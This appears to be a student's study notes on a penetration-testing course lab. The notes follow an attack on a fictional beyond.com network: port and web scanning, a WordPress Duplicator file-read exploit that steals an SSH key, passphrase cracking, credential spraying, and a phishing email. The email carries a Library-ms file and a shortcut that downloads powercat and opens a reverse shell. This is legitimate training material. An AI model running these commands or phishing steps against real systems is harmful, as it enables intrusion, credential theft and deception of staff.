---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 25: Assembling the Pieces

## Enumerating the Public Network

### MAILSRV1

{% code overflow="wrap" %}
```bash
# Setting up a basic directory structure for the assessment
kali@kali:~$ mkdir beyond

kali@kali:~$ cd beyond

kali@kali:~/beyond$ mkdir mailsrv1

kali@kali:~/beyond$ mkdir websrv1

kali@kali:~/beyond$ touch creds.txt
```
{% endcode %}

{% hint style="warning" %}
Documenting our findings is a crucial process for every penetration test. For this Module, we'll store results in the basic work environment we just set up. However, Markdown editors, such as _Obsidian_, have become quite popular for documenting findings and data in real assessments as they are application-independent and contain functions that will simplify report writing and collaboration.
{% endhint %}

Beginning with a port scan:

{% code overflow="wrap" %}
```bash
# We'll use -sV to enable service and version detection as well as -sC to use Nmap's default scripts. In addition, we'll enter -oN to create an output file containing the scan results.
kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 08:53 EDT
Nmap scan report for 192.168.50.242
Host is up (0.11s latency).
Not shown: 992 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN OK ACL IMAP4rev1 completed CAPABILITY NAMESPACE IDLE RIGHTS=texkA0001 SORT QUOTA
445/tcp open  microsoft-ds?
587/tcp open  smtp          hMailServer smtpd
| smtp-commands: MAILSRV1, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
Service Info: Host: MAILSRV1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-29T12:54:00
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: 21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.95 seconds
```
{% endcode %}

{% hint style="warning" %}
In a real penetration test, we would also use passive information gathering techniques such as _Google Dorks_ and leaked password databases to obtain additional information. This would potentially provide us with usernames, passwords, and sensitive information.

\
Even if we had found a vulnerability with a matching exploit providing the code execution, we should not skip the remaining enumeration steps. While we may get access to the target system, we could potentially miss out on vital data or information for other services and systems.
{% endhint %}

Trying to bust some directories:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># We'll enter dir to use directory enumeration mode, -u for the URL, -w for a wordlist, and -x for file types we want to identify. For this example, we'll enter txt, pdf, and config to identify potential documents or configuration files. In addition, we'll use -o to create an output file.
</strong><strong>kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config 
</strong>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.242
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,pdf,config
[+] Timeout:                 10s
===============================================================
2022/09/29 11:12:27 Starting gobuster in directory enumeration mode
===============================================================

                                
===============================================================
2022/09/29 11:16:00 Finished
===============================================================
</code></pre>

{% hint style="warning" %}
Not every enumeration technique needs to provide actionable results. In the initial information gathering phase, it is important to perform a variety of enumeration methods to get a complete picture of a system.
{% endhint %}

### WEBSRV1

{% hint style="info" %}
In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings.
{% endhint %}

Nmap scanning new target:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 11:18 EDT
Nmap scan report for 192.168.50.244
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:c8:5e:cd:62:a0:78:b4:6e:d8:dd:0e:0b:8b:3a:4c (ECDSA)
|_  256 8d:6d:ff:a4:98:57:82:95:32:82:64:53:b2:d7:be:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-title: BEYOND Finances &#8211; We provide financial freedom
|_Requested resource was http://192.168.50.244/main/
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: WordPress 6.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```
{% endcode %}

Using **whatweb** to determine the technology stack of the webpage:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ whatweb http://192.168.50.244                                                        
http://192.168.50.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], RedirectLocation[http://192.168.50.244/main/], UncommonHeaders[x-redirect-by]
http://192.168.50.244/main/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.50.244], JQuery[3.6.0], MetaGenerator[WordPress 6.0.2], Script, Title[BEYOND Finances &#8211; We provide financial freedom], UncommonHeaders[link], WordPress[6.0.2]
```
{% endcode %}

Using **wpscan** to enumerate wordpress vulnerabilities:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># To perform the scan without an API key, we'll provide the URL of the target for --url, set the plugin detection to aggressive, and specify to enumerate all popular plugins by entering p as an argument to --enumerate. In addition, we'll use -o to create an output file.
</strong><strong>kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
</strong>
kali@kali:~/beyond$ cat websrv1/wpscan
...

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.50.244/wp-content/plugins/akismet/
 | Latest Version: 5.0
 | Last Updated: 2022-07-26T16:13:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/akismet/, status: 500
 |
 | The version could not be determined.

[+] classic-editor
 | Location: http://192.168.50.244/wp-content/plugins/classic-editor/
 | Latest Version: 1.6.2 
 | Last Updated: 2021-07-21T22:08:00.000Z
...

[+] contact-form-7
 | Location: http://192.168.50.244/wp-content/plugins/contact-form-7/
 | Latest Version: 5.6.3 (up to date)
 | Last Updated: 2022-09-01T08:48:00.000Z
...

[+] duplicator
 | Location: http://192.168.50.244/wp-content/plugins/duplicator/
 | Last Updated: 2022-09-24T17:57:00.000Z
 | Readme: http://192.168.50.244/wp-content/plugins/duplicator/readme.txt
 | [!] The version is out of date, the latest version is 1.5.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/, status: 403
 |
 | Version: 1.3.26 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.50.244/wp-content/plugins/duplicator/readme.txt

[+] elementor
 | Location: http://192.168.50.244/wp-content/plugins/elementor/
 | Latest Version: 3.7.7 (up to date)
 | Last Updated: 2022-09-20T14:51:00.000Z
...

[+] wordpress-seo
 | Location: http://192.168.50.244/wp-content/plugins/wordpress-seo/
 | Latest Version: 19.7.1 (up to date)
 | Last Updated: 2022-09-20T14:10:00.000Z
...
</code></pre>

Using **searchsploit** to search for vulnerabilities in plugins discovered, staring with the outdated duplicator plugin:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ searchsploit duplicator    
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Duplicator - Cross-Site Scripting                                    | php/webapps/38676.txt
WordPress Plugin Duplicator 0.5.14 - SQL Injection / Cross-Site Request Forgery       | php/webapps/36735.txt
WordPress Plugin Duplicator 0.5.8 - Privilege Escalation                              | php/webapps/36112.txt
WordPress Plugin Duplicator 1.2.32 - Cross-Site Scripting                             | php/webapps/44288.txt
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read              | php/webapps/50420.py
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit) | php/webapps/49288.rb
WordPress Plugin Duplicator 1.4.6 - Unauthenticated Backup Download                   | php/webapps/50992.txt
WordPress Plugin Duplicator 1.4.7 - Information Disclosure                            | php/webapps/50993.txt
WordPress Plugin Multisite Post Duplicator 0.9.5.1 - Cross-Site Request Forgery       | php/webapps/40908.html
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
{% endcode %}

## Attacking a Public Machine

### Initial Foothold

Examining an exploit found via searchsploit:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ searchsploit -x 50420
```
{% endcode %}

Using the exploit to get **daniela**'s private ssh key:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
...
UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
QduOTpMIvVMIJcfeYF1GJ4ggUG4=
-----END OPENSSH PRIVATE KEY-----

```
{% endcode %}

Making the private key usable and finding it has a passphrase:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ chmod 600 id_rsa

kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 
```
{% endcode %}



Cracking the passphrase on the private key:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash

kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
...
tequieromucho    (id_rsa) 
...
```
{% endcode %}

Using the private key with the cracked passphrase:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
Enter passphrase for key 'id_rsa': 

Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
...
daniela@websrv1:~$ 
```
{% endcode %}

### A Link to the Past

1. _Host linpeas.sh via `python3 -m http.server 80`_
2. _Transfer to websrv1_
3. _Run linpeas.sh_
4. _Decide on path of attack. In our case we abuse being able to execute `git` with sudo, without a password._
5. _Check out the git history via `git log` then display the differences with `git show` to avoid disrupting the client's web server._

## Gaining Access to the Internal Network

### Domain Credentials

Using crackmapexec with the credentials we've discovered so far:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\marcus:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\john:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:tequieromucho STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:DanielKeyboard3311 STATUS_LOGON_FAILURE 
SMB         192.168.50.242  445    MAILSRV1         [-] beyond.com\daniela:dqsTwTpZPn#nL STATUS_LOGON_FAILURE 
```
{% endcode %}

This shows that john has valid credentials to MAILSRV1, we've identified the domain name as **beyond.com** and reviewing nmap shows there likely aren't any services we can utilize our validated credentials on.

This leave us with two options:\
1\. Further enumerate SMB on MAILSRV1, checking for sensitive data on accessible shares.\
2\. Prepare a malicious attachment and send a phishing email as _john_ to _daniela_ and _marcus_.

Using **crackmapexec** to list SMB shares:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares  
SMB         192.168.50.242  445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
SMB         192.168.50.242  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
SMB         192.168.50.242  445    MAILSRV1         [+] Enumerated shares
SMB         192.168.50.242  445    MAILSRV1         Share           Permissions     Remark
SMB         192.168.50.242  445    MAILSRV1         -----           -----------     ------
SMB         192.168.50.242  445    MAILSRV1         ADMIN$                          Remote Admin
SMB         192.168.50.242  445    MAILSRV1         C$                              Default share
SMB         192.168.50.242  445    MAILSRV1         IPC$            READ            Remote IPC
```
{% endcode %}

No dice, time to do some phishing.

### Phishing for Access

Prepping the WebDAV share:

{% code overflow="wrap" %}
```bash
kali@kali:~$ mkdir /home/kali/beyond/webdav

kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
Running without configuration file.
04:47:04.860 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
04:47:04.861 - INFO    : WsgiDAV/4.0.2 Python/3.10.7 Linux-5.18.0-kali7-amd64-x86_64-with-glibc2.34
04:47:04.861 - INFO    : Lock manager:      LockManager(LockStorageDict)
04:47:04.861 - INFO    : Property manager:  None
04:47:04.861 - INFO    : Domain controller: SimpleDomainController()
04:47:04.861 - INFO    : Registered DAV providers by route:
04:47:04.861 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/home/kali/.local/lib/python3.10/site-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
04:47:04.861 - INFO    :   - '/': FilesystemProvider for path '/home/kali/beyond/webdav' (Read-Write) (anonymous)
04:47:04.861 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
04:47:04.861 - WARNING : Share '/' will allow anonymous write access.
04:47:04.861 - WARNING : Share '/:dir_browser' will allow anonymous read access.
04:47:05.149 - INFO    : Running WsgiDAV/4.0.2 Cheroot/8.6.0 Python 3.10.7
04:47:05.149 - INFO    : Serving on http://0.0.0.0:80 ...
```
{% endcode %}

Creating our malicious attachment:

{% code title="config.Library-ms" overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
{% endcode %}

Now let's make a shortcut to execute a reverse shell:

{% code title="install.lnk" overflow="wrap" %}
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
```
{% endcode %}

Copying powercat to our current directory, hosting it via python as well as starting a netcat listener:

{% code overflow="wrap" %}
```bash
kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

kali@kali:~/beyond$ python3 -m http.server 8000 &
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

kali@kali:~/beyond$ nc -nvlp 4444 & 
listening on [any] 4444 ...
```
{% endcode %}

Using _swaks_ to send the email:

{% code overflow="wrap" %}
```bash
# Creating the body in body.txt
kali@kali:~/beyond$ cat body.txt
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John

# Now we are ready to build the swaks command to send the emails. We'll provide daniela@beyond.com and marcus@beyond.com as recipients of the email to -t, john@beyond.com as name on the email envelope (sender) to --from, and the Windows Library file to --attach. Next, we'll enter --suppress-data to summarize information regarding the SMTP transactions. For the email subject and body, we'll provide Subject: Staging Script to --header and body.txt to --body. In addition, we'll enter the IP address of MAILSRV1 for --server. Finally, we'll add -ap to enable password authentication.
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
Username: john
Password: dqsTwTpZPn#nL
=== Trying 192.168.50.242:25...
=== Connected to 192.168.50.242.
<-  220 MAILSRV1 ESMTP
 -> EHLO kali
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 36 lines sent
<-  250 Queued (1.088 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```
{% endcode %}

Waiting a few moments...

{% code overflow="wrap" %}
```powershell
listening on [any] 4444 ...
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 64264
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus

PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1

PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.6.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.6.254
PS C:\Windows\System32\WindowsPowerShell\v1.0>
```
{% endcode %}

## Enumerating the Internal Network

### Situational Awareness

### Services and Sessions

## Attacking an Internal Web Application

### Speak Kerberaost and Enter

### Abuse a WordPress Plugin for a Relay Attack

## Gaining Access to the Domain Controller

### Cached Credentials

### Lateral Movement
